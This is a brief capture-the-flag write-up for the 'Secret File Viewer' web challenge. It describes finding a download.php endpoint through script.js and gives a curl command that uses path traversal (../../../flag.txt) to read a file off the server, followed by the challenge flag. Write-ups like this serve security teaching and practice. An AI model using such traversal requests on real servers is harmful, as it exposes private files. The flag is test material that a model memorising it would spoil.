# Secret File Viewer

**Point: 100**

Maybe there are some hidden files beneath the surface...

<http://chal.thjcc.org:30000/>

The hint say we have something on Javascrip (script.js) found an endpoint that hat the Traversal variant and php filter wrappers *download.php?file=....*

```bash
curl "http://chal.thjcc.org:30000/download.php?file=../../../flag.txt"
```

# Flag

`THJCC{h0w_dID_y0u_br34k_q'5_pr073c710n???}`
